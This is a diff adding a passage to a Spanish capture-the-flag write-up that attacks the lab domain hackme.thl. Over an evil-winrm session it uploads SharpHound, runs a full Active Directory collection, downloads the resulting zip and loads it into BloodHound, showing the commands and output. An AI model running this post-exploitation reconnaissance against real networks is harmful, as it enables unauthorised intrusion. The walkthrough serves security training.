@@ -18,6 +18,7 @@ image: https://github.com/user-attachments/assets/314a021e-123d-4111-ae5c-49c919
 * Cracking hashes
 * Information Lekeage
 * AS-REP Roasting
+* BloodHound analysis
 
 ## Enumeration
 
@@ -297,3 +298,95 @@ hackme\jdoe
 
 ### User Pivoting
 
+Utilizo BloodHound para identificar puntos débiles en la configuración de Active Directory que me puedan permitir escalar mis privilegios
+
+```bash
+*Evil-WinRM* PS C:\Users\jdoe\Documents\BloodHound> upload SharpHound.exe
+                                        
+Info: Uploading /home/ju4ncaa/Documentos/Hacking/Curiosity/content/SharpHound.exe to C:\Users\jdoe\Documents\BloodHound\SharpHound.exe
+                                        
+Data: 2075988 bytes of 2075988 bytes copied
+                                        
+Info: Upload successful!
+```
+
+Subo SharpHound a través de evil-winrm para recopila datos del controlador de dominio
+
+```bash
+*Evil-WinRM* PS C:\Users\jdoe\Documents\BloodHound> .\SharpHound.exe -c All
+2025-02-11T17:24:30.1528866+01:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
+2025-02-11T17:24:30.2311957+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
+2025-02-11T17:24:30.2468275+01:00|INFORMATION|Initializing SharpHound at 17:24 on 11/02/2025
+2025-02-11T17:24:30.2624475+01:00|INFORMATION|Resolved current domain to hackme.thl
+2025-02-11T17:24:30.3253161+01:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
+2025-02-11T17:24:30.3715206+01:00|INFORMATION|Beginning LDAP search for hackme.thl
+2025-02-11T17:24:30.4028314+01:00|INFORMATION|Beginning LDAP search for hackme.thl Configuration NC
+2025-02-11T17:24:30.4184629+01:00|INFORMATION|Producer has finished, closing LDAP channel
+2025-02-11T17:24:30.4184629+01:00|INFORMATION|LDAP channel closed, waiting for consumers
+2025-02-11T17:24:30.4655223+01:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HACKME.THL
+2025-02-11T17:24:30.5593936+01:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HACKME.THL
+2025-02-11T17:24:30.7627079+01:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HACKME.THL
+2025-02-11T17:24:30.8401638+01:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HACKME.THL
+2025-02-11T17:24:31.1687870+01:00|INFORMATION|Consumers finished, closing output channel
+2025-02-11T17:24:31.1844173+01:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2025-02-11T17:24:31.3252071+01:00|INFORMATION|Status: 373 objects finished (+373 Infinity)/s -- Using 39 MB RAM
+2025-02-11T17:24:31.3252071+01:00|INFORMATION|Enumeration finished in 00:00:00.9608488
+2025-02-11T17:24:31.3721048+01:00|INFORMATION|Saving cache with stats: 23 ID to type mappings.
+ 1 name to SID mappings.
+ 1 machine sid mappings.
+ 4 sid to domain mappings.
+ 0 global catalog mappings.
+2025-02-11T17:24:31.3877869+01:00|INFORMATION|SharpHound Enumeration Completed at 17:24 on 11/02/2025! Happy Graphing!
+```
+
+Una vez ejecutado se crean dos archivos un .bin y .zip, el archivo .zip es el que hay cargar en BloodHound por lo que lo descargo con evil-winrm
+
+```bash
+*Evil-WinRM* PS C:\Users\jdoe\Documents\BloodHound> dir
+
+    Directory: C:\Users\jdoe\Documents\BloodHound
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/11/2025   5:24 PM          36778 20250211172430_BloodHound.zip
+-a----        2/11/2025   5:24 PM           1852 MGVmMzZlNzEtOGNkZi00M
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\jdoe\Documents\BloodHound> download 20250211172430_BloodHound.zip
+                                        
+Info: Downloading C:\Users\jdoe\Documents\BloodHound\20250211172430_BloodHound.zip to 20250211172430_BloodHound.zip
+                                        
+Info: Download successful!
+```
+
+Una vez descargado el .zip inicio neo4j y cargo el archivo en BloodHound
+
+```bash
+neo4j console
+Directories in use:
+home:         /usr/share/neo4j
+config:       /usr/share/neo4j/conf
+logs:         /etc/neo4j/logs
+plugins:      /usr/share/neo4j/plugins
+import:       /usr/share/neo4j/import
+data:         /etc/neo4j/data
+certificates: /usr/share/neo4j/certificates
+licenses:     /usr/share/neo4j/licenses
+run:          /var/lib/neo4j/run
+Starting Neo4j.
+2025-02-11 16:30:23.245+0000 INFO  Starting...
+2025-02-11 16:30:23.439+0000 INFO  This instance is ServerId{489d6a72} (489d6a72-6029-479a-89d6-e4a21e9ebc70)
+2025-02-11 16:30:24.019+0000 INFO  ======== Neo4j 4.4.26 ========
+2025-02-11 16:30:24.584+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
+2025-02-11 16:30:24.584+0000 INFO  Updating the initial password in component 'security-users'
+2025-02-11 16:30:24.662+0000 INFO  Bolt enabled on localhost:7687.
+2025-02-11 16:30:25.053+0000 INFO  Remote interface available at http://localhost:7474/
+2025-02-11 16:30:25.055+0000 INFO  id: A59061A79F1A9CB3877073C6E5598848BA9042EEDC862DCD1F077E623A63341F
+2025-02-11 16:30:25.055+0000 INFO  name: system
+2025-02-11 16:30:25.056+0000 INFO  creationDate: 2025-02-11T16:29:11.83Z
+2025-02-11 16:30:25.056+0000 INFO  Started.
+```
+
+![image](https://github.com/user-attachments/assets/ca0caf94-0399-4950-8fae-71c05d8a3b49)
